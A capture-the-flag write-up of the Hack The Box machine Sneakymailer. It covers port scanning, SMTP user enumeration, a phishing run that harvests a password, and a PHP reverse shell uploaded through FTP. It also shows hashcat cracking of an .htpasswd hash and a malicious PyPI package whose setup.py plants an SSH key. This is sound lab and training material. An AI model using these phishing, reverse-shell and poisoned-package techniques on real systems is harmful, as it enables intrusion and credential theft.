# Sneakymailer | Hack The Box

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -T4 -p- 10.10.10.197
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 08:45 EDT
Nmap scan report for 10-10-10-197.tpgi.com.au (10.10.10.197)
Host is up (0.34s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: ENABLE IDLE QUOTA STARTTLS NAMESPACE UIDPLUS CAPABILITY ACL2=UNION UTF8=ACCEPTA0001 OK completed ACL THREAD=REFERENCES CHILDREN SORT THREAD=ORDEREDSUBJECT IMAP4rev1
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/13%OT=21%CT=1%CU=42013%PV=Y%DS=2%DC=T%G=Y%TM=5F0C5C5
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   339.36 ms 10.10.14.1
2   340.68 ms 10-10-10-197.tpgi.com.au (10.10.10.197)

OS and Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in
1268.79 seconds
```
The target is a Linux machine that has FTP, SSH, SMTP, IMAP, and two Nginx web servers running.

### 2. Enumerate web servers
Let's start with the web servers because why not.  
The server on port 80 redirects to a hostname. Following this redirect leads to a Sneaky Corp employee dashboard. There is minimal functionality, however there is a staff list which gives a list of users, roles and emails. There are messages and notifications in the top right corner, but they are not clickable for some reason. In the I can read truncated versions of these messages. Basically Bradley Greer is the name of the code tester for the two projects that Sneaky Corp is working on. There is also a visible message saying pip can be used to install modules on the company servers, though the project is only 80% complete, compared with the mail servers project which is 100% complete.  
Viewing the source of this dashboard page, there is a comment:
```html
 <!-- need to add Register link to Sidebar for /pypi/register.php -->
```
Additionally, there is an /img directory which stores all the page's images. The register.php page is, of course a page to register an account. However, it seems to do absolutely nothing. Looking at the sent requests through a proxy shows that the returned response from any post request sent from this form is just the register.php page again.  
My subdomain enumeration did not go too smoothly due to the domain name needing to be resolved. There must be a better way to enumerate domain names for boxes set up like this one, which I will try and find in the future. I did find a method that worked using wfuzz:
```bash
kali@kali:~/Desktop/htb/sneakymailer$ wfuzz -H 'Host: FUZZ.sneakycorp.htb' -u sneakycorp.htb -w /usr/share/wordlists/Probable-Wordlists/Technical_and_Default/Domains_ProbWL.txt --hc 301 --hc 400

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
*                                                      *
* Version up to 1.4c coded by:                         *
* Christian Martorella (cmartorella@edge-security.com) *
* Carlos del ojo (deepbit@gmail.com)                   *
*                                                      *
* Version 1.4d to 2.4.5 coded by:                      *
* Xavier Mendez (xmendez@edge-security.com)            *
********************************************************

Usage:  wfuzz [options] -z payload,params <url>

        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.
        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.


Examples:
        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z
        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}
        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ

Type wfuzz -h for further information or --help for advanced usage.

Fatal exception: Bad usage: Only one --hc option could be specified at the same time.
kali@kali:~/Desktop/htb/sneakymailer$ wfuzz -H 'Host: FUZZ.sneakycorp.htb' -u sneakycorp.htb -w /usr/share/wordlists/Probable-Wordlists/Technical_and_Default/Domains_ProbWL.txt --hc 301 --hh 173

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://sneakycorp.htb/
Total requests: 265568

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000047042:   200        340 L    989 W    13737 Ch    "dev"
000096386:   301        7 L      12 W     185 Ch      "jbam-themes"
Finishing pending requests...
```
This recovered one real subdomain - dev.sneakycorp.htb. The site appears to be identical to the main branch.
The other web server running on 8080 is showing the plain "Welcome to Nginx" page, and not much else. Subdomain and directory enumeration doesn't yield any results.

### 3. Enumerate mail services
Starting from SMTP on port 25. Since I have gathered a list of e-mail addresses from the website, this ran be ran against the SMTP service to confirm they are all actually registered.
```bash
msf5 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb
[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
This confirms all 57 accounts are currently active. Moving to the IMAP services, there's not really much that can be done with them, other than verify their versions and check for vulnerabilities (none are known).
The FTP does not accept anoynomous logins, and so there does not appear to be anywhere else to go at this point through enumeration. At this point, the only useful information gathered has been the e-mail address list.

### 4. Phish e-mail addresses
Create a script to send an e-mail to every address. (see phish.py) The script allows me to easily test different payloads until I find one which works. I tried to use other tools first, such as SEtoolkit, but in the end I decided to just do my own thing.
I had two ideas for how to do the payload:
- Give an attachment binary that opens a reverse shell.
- Supply a link to a page that steals a cookie.
The easiest thing to try first was to send a simple payload that checks to see if links are being interacted with.  
Firstly, open port 80 for listening.
```bash
kali@kali:~/Desktop/htb/sneakymailer$ sudo nc -lvp 80
Listening on 0.0.0.0 80
```
Send the emails:
```bash
kali@kali:~/Desktop/htb/sneakymailer$ ./phish.py 
Sending to: airisatou@sneakymailer.htb - message sent!
Sending to: angelicaramos@sneakymailer.htb - message sent!
Sending to: ashtoncox@sneakymailer.htb - message sent!
Sending to: bradleygreer@sneakymailer.htb - message sent!
Sending to: brendenwagner@sneakymailer.htb - message sent!
Sending to: briellewilliamson@sneakymailer.htb - message sent!
Sending to: brunonash@sneakymailer.htb - message sent!
Sending to: caesarvance@sneakymailer.htb - message sent!
Sending to: carastevens@sneakymailer.htb - message sent!
Sending to: cedrickelly@sneakymailer.htb - message sent!
Sending to: chardemarshall@sneakymailer.htb - message sent!
Sending to: colleenhurst@sneakymailer.htb - message sent!
Sending to: dairios@sneakymailer.htb - message sent!
Sending to: donnasnider@sneakymailer.htb - message sent!
Sending to: doriswilder@sneakymailer.htb - message sent!
Sending to: finncamacho@sneakymailer.htb - message sent!
Sending to: fionagreen@sneakymailer.htb - message sent!
Sending to: garrettwinters@sneakymailer.htb - message sent!
Sending to: gavincortez@sneakymailer.htb - message sent!
Sending to: gavinjoyce@sneakymailer.htb - message sent!
Sending to: glorialittle@sneakymailer.htb - message sent!
Sending to: haleykennedy@sneakymailer.htb - message sent!
Sending to: hermionebutler@sneakymailer.htb - message sent!
Sending to: herrodchandler@sneakymailer.htb - message sent!
Sending to: hopefuentes@sneakymailer.htb - message sent!
Sending to: howardhatfield@sneakymailer.htb - message sent!
Sending to: jacksonbradshaw@sneakymailer.htb - message sent!
Sending to: jenagaines@sneakymailer.htb - message sent!
Sending to: jenettecaldwell@sneakymailer.htb - message sent!
Sending to: jenniferacosta@sneakymailer.htb - message sent!
Sending to: jenniferchang@sneakymailer.htb - message sent!
Sending to: jonasalexander@sneakymailer.htb - message sent!
Sending to: laelgreer@sneakymailer.htb - message sent!
Sending to: martenamccray@sneakymailer.htb - message sent!
Sending to: michaelsilva@sneakymailer.htb - message sent!
Sending to: michellehouse@sneakymailer.htb - message sent!
Sending to: olivialiang@sneakymailer.htb - message sent!
Sending to: paulbyrd@sneakymailer.htb - message sent!
Sending to: prescottbartlett@sneakymailer.htb - message sent!
Sending to: quinnflynn@sneakymailer.htb - message sent!
Sending to: rhonadavidson@sneakymailer.htb - message sent!
Sending to: sakurayamamoto@sneakymailer.htb - message sent!
Sending to: sergebaldwin@sneakymailer.htb - message sent!
Sending to: shaddecker@sneakymailer.htb - message sent!
Sending to: shouitou@sneakymailer.htb - message sent!
Sending to: sonyafrost@sneakymailer.htb - message sent!
Sending to: sukiburks@sneakymailer.htb - message sent!
Sending to: sulcud@sneakymailer.htb - message sent!
Sending to: tatyanafitzpatrick@sneakymailer.htb - message sent!
Sending to: thorwalton@sneakymailer.htb - message sent!
Sending to: tigernixon@sneakymailer.htb - message sent!
Sending to: timothymooney@sneakymailer.htb - message sent!
Sending to: unitybutler@sneakymailer.htb - message sent!
Sending to: vivianharrell@sneakymailer.htb - message sent!
Sending to: yuriberry@sneakymailer.htb - message sent!
Sending to: zenaidafrank@sneakymailer.htb - message sent!
Sending to: zoritaserrano@sneakymailer.htb - message sent!
```
After the script completes, it can be seen that the port has recieved data.
```bash
Connection received on sneakymailer.htb 58368
POST / HTTP/1.1
Host: 10.10.14.120
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```
The recieved post data appears to contain a username and password which are URL encoded, as indicated by the content type header. This data decodes to:
```
firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

### 5. Use the phished creds
After trying the creds with a few different services, I discovered the provided credentials do give access to Paul Byrd's mail account. To get the access, I needed to download an email reader and connect it to the IMAP service on port 143 so that I could retrieve the user's mailboxes. In the "sent items" folder, there is two e-mails:
```
From:  Paul Byrd <paulbyrd@sneakymailer.htb>
To: low@debian
Subject:  Module testing
Date: Wed, 27 May 2020 13:28:58 -0400
Hello low
Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
```
and
```
From: Paul Byrd <paulbyrd@sneakymailer.htb>
To: root <root@debian>
Subject:  Password reset
Date: Fri, 15 May 2020 13:03:37 -0500 (05/15/2020 02:03:37 PM)
Hello administrator, I want to change this password for the developer account
 
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
Please notify me when you do it
```

### 6. Use the developer creds
Just like last time, I take these creds and go back over all the different services trying them with each one. This time, I get logged into an FTP account. I notice the "team.php" file, which indicates this is most likely some developer branch of the sneakycorp website. Since there are a lot of files, I log out and download them all to investigate properly.
```bash
kali@kali:~/Desktop/htb/sneakymailer$ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jul 19 09:13 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
ftp> quit
221 Goodbye.
kali@kali:~/Desktop/htb/sneakymailer$ wget -r --user="developer" --password="m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C" ftp://10.10.10.197
--2020-07-19 09:16:52--  ftp://10.10.10.197/
           => ‘10.10.10.197/.listing’
Connecting to 10.10.10.197:21... connected.
Logging in as developer ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

10.10.10.197/.listing                             [ <=>                                            ]     180  --.-KB/s    in 0s      

2020-07-19 09:16:57 (14.7 MB/s) - ‘10.10.10.197/.listing’ saved [180]

Removed ‘10.10.10.197/.listing’.
--2020-07-19 09:16:57--  ftp://10.10.10.197/dev/
           => ‘10.10.10.197/dev/.listing’
==> CWD (1) /dev ... done.
==> PASV ... done.    ==> LIST ... done.
...
```

### 7. Investigate the files
Looking through the files, there doesn't appear to be anything useful in them - it resembles an idential copy of the main website, which reminded me of the dev subdomain that was discovered earlier. If these files represent a live website on the dev subdomain, then a modification on a file on this FTP account would be reflected on the website. To test this, I cupload a test file to the server and then try and access it through the dev subdomain.
```bash
kali@kali:~/Desktop/htb/sneakymailer/dev$ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jul 20 06:58 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
ftp> put test.html
local: test.html remote: test.html
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5 bytes sent in 0.00 secs (128.4951 kB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
--wxrw-rw-    1 1001     1001            5 Jul 20 07:00 test.html
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
ftp> exit
221 Goodbye.
kali@kali:~/Desktop/htb/sneakymailer/dev$ curl dev.sneakycorp.htb/test.html
test
```
It appears to work.

### 8. Get a shell
I attempt to upload a PHP reverse shell to the FTP, which I can then access to send the shell to my machine. Firstly listen on a port:
```bash
kali@kali:~$ nc -lvp 9999
Listening on 0.0.0.0 9999
```
Then grab the pentestmonkey reverse shell, modify it as needed and upload:
```bash
kali@kali:~/Desktop/htb/sneakymailer$ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:kali): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd dev
250 Directory successfully changed.
ftp> put info.php
local: info.php remote: info.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5494 bytes sent in 0.00 secs (41.5832 MB/s)
```
Then accessing the file at dev.sneakycorp.htb/info.php triggers the shell.
```bash
kali@kali:~$ nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on sneakycorp.htb 54328
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 07:08:25 up  1:25,  0 users,  load average: 0.03, 0.06, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### 9. Enumerate www-data
First thing I do as www-data is check out the stuff in /var/www.
```bash
www-data@sneakymailer:~$ ls
ls
dev.sneakycorp.htb  html  pypi.sneakycorp.htb  sneakycorp.htb
www-data@sneakymailer:~$ cd pypi.sneakycorp.htb
cd pypi.sneakycorp.htb
www-data@sneakymailer:~/pypi.sneakycorp.htb$ ls
ls
packages  venv
www-data@sneakymailer:~/pypi.sneakycorp.htb$ cd packages
cd packages
bash: cd: packages: Permission denied
www-data@sneakymailer:~/pypi.sneakycorp.htb$ ls -la
ls -la
total 20
drwxr-xr-x 4 root root     4096 May 15 14:29 .
drwxr-xr-x 6 root root     4096 May 14 18:25 ..
-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd
drwxrwx--- 2 root pypi-pkg 4096 Jul 20 06:17 packages
drwxr-xr-x 6 root pypi     4096 May 14 18:25 venv
www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd
cat .htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```
Some research online shows this to be a salted MD5 hash.  
Before moving on, some further enumeration:
```bash
www-data@sneakymailer:~/pypi.sneakycorp.htb/venv$ cat pyvenv.cfg
cat pyvenv.cfg
home = /usr/bin
include-system-site-packages = false
version = 3.7.3
```
This is the pyvenv config showing version 3.7.3.
```bash
www-data@sneakymailer:~$ cd html
cd html
www-data@sneakymailer:~/html$ ls
ls
index.nginx-debian.html
```
This appears to be the second web server on port 8080. The lack of content here suggests it is indeed pointless.
```bash
www-data@sneakymailer:~$ cd /home
cd /home
www-data@sneakymailer:/home$ ls
ls
low  vmail
```
Two users exist with folders on the machine. Low, which is the "user", and an account called "vmail

### 10. Crack the hash
This site - https://www.askapache.com/online-tools/htpasswd-generator/ has some good information on the types of hashes typically found in htpasswd. In particular, this section is of interest:  
*iMD5 is one in a series of message digest algorithms designed by Professor Ronald Rivest of MIT. The 128-bit (16-byte) MD5 hashes (also termed message digests) are typically represented as a sequence of 32 hexadecimal digits. In .htpasswd files the hash is: $apr1$ + an Apache-specific algorithm using an iterated (1,000 times) MD5 digest of various combinations of a random 32-bit salt and the password. ALG_APMD5.*
  
Knowing this, I can copy the hash into a file and run hashcat using the appropriate settings.
```bash
kali@kali:~/Desktop/htb/sneakymailer$ vim hthash.hash
kali@kali:~/Desktop/htb/sneakymailer$ hashcat -a 0 -m 1600 hthash.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.0.0) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 1424/1488 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
Time.Started.....: Mon Jul 20 07:32:05 2020, (4 mins, 33 secs)
Time.Estimated...: Mon Jul 20 07:36:38 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    13221 H/s (9.22ms) @ Accel:256 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3614720/14344385 (25.20%)
Rejected.........: 0/3614720 (0.00%)
Restore.Point....: 3613696/14344385 (25.19%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidates.#1....: soul706 -> sotoba6

Started: Mon Jul 20 07:31:37 2020
Stopped: Mon Jul 20 07:36:40 2020
```
The pypi password is recovered as soufianeelhaoui.

### 11. Use these creds with pypi
Though htpasswd creds are used to store credentials for HTTP authentication, I started trying them with everything else first. This was based on my previous experiences of how ofter passwords are reused - though this time that did not appear to be the case. I started with SSH since I knew both the user accounts on the machine. No luck there. Following that was FTP, also no luck. Beyond this, I started digging into pypi, remembering there was functionality that existed behind a "register" portal on both the website and also in the "packages" folder I couldn't access as www-data. By reading this page: https://zestreleaser.readthedocs.io/en/latest/uploading.html, I learned that these credentials allow for packages to be uploaded to "custom servers", and figured that's what was required here.
Another extremely useful reference: https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/  
The process is basically like so:  
1. Create the package directory to hold all it's files (see pypi/)
2. Create the setup file (see pypi/setup.py). This file sets up the package, and so some code to help get us another shell can go here
3. Create the init file (see pypi/jib1337/__init__.py)
4. Create setup.cfg and README.md (see respective files)
4. Compress the package:
```bash
kali@kali:~/Desktop/htb/sneakymailer/pypi$ python setup.py sdist
running sdist
running egg_info
creating jib1337.egg-info
writing jib1337.egg-info/PKG-INFO
writing top-level names to jib1337.egg-info/top_level.txt
writing dependency_links to jib1337.egg-info/dependency_links.txt
writing manifest file 'jib1337.egg-info/SOURCES.txt'
reading manifest file 'jib1337.egg-info/SOURCES.txt'
writing manifest file 'jib1337.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating jib1337-1.337
creating jib1337-1.337/jib1337
creating jib1337-1.337/jib1337.egg-info
copying files to jib1337-1.337...
copying setup.py -> jib1337-1.337
copying jib1337/__init__.py -> jib1337-1.337/jib1337
copying jib1337.egg-info/PKG-INFO -> jib1337-1.337/jib1337.egg-info
copying jib1337.egg-info/SOURCES.txt -> jib1337-1.337/jib1337.egg-info
copying jib1337.egg-info/dependency_links.txt -> jib1337-1.337/jib1337.egg-info
copying jib1337.egg-info/top_level.txt -> jib1337-1.337/jib1337.egg-info
Writing jib1337-1.337/setup.cfg
creating dist
Creating tar archive
removing 'jib1337-1.337' (and everything under it)
```
5. Create the .pypirc file in the user home (see .pypirc)
6. Upload the file to the server.
The first payload I tried was a reverse shell, however all I ended up doing was shelling my own machine (lol), after which the upload would fail because setup.py couldn't finish. I forgot that setup.py would execute on my machine before the server. I can't use a try/catch with the reverse shell because there's no simple way in which the setup.py can tell my machine and the victim apart. I needed a payload that would fail gracefully on my machine and not mess with the setup. That led me to adding my pubkey to the ssh directory of user low instead. The try/catch will fail gracefully without needing to create extra processes like the reverse shell.  
The upload succeeds.
```bash
kali@kali:~/Desktop/htb/sneakymailer/pypi$ python setup.py sdist register -r sneakycorp upload -r sneakycorp
running sdist
running egg_info
writing jib1337.egg-info/PKG-INFO
writing top-level names to jib1337.egg-info/top_level.txt
writing dependency_links to jib1337.egg-info/dependency_links.txt
reading manifest file 'jib1337.egg-info/SOURCES.txt'
writing manifest file 'jib1337.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating jib1337-1.337
creating jib1337-1.337/jib1337
creating jib1337-1.337/jib1337.egg-info
copying files to jib1337-1.337...
copying setup.py -> jib1337-1.337
copying jib1337/__init__.py -> jib1337-1.337/jib1337
copying jib1337.egg-info/PKG-INFO -> jib1337-1.337/jib1337.egg-info
copying jib1337.egg-info/SOURCES.txt -> jib1337-1.337/jib1337.egg-info
copying jib1337.egg-info/dependency_links.txt -> jib1337-1.337/jib1337.egg-info
copying jib1337.egg-info/top_level.txt -> jib1337-1.337/jib1337.egg-info
Writing jib1337-1.337/setup.cfg
Creating tar archive
removing 'jib1337-1.337' (and everything under it)
running register
Registering jib1337 to http://pypi.sneakycorp.htb:8080
Server response (200): OK
running upload
Submitting dist/jib1337-1.337.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK
```
I can then try logging in over SSH.
```bash
kali@kali:~/.ssh$ ssh -i id_rsa low@sneakycorp.htb
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

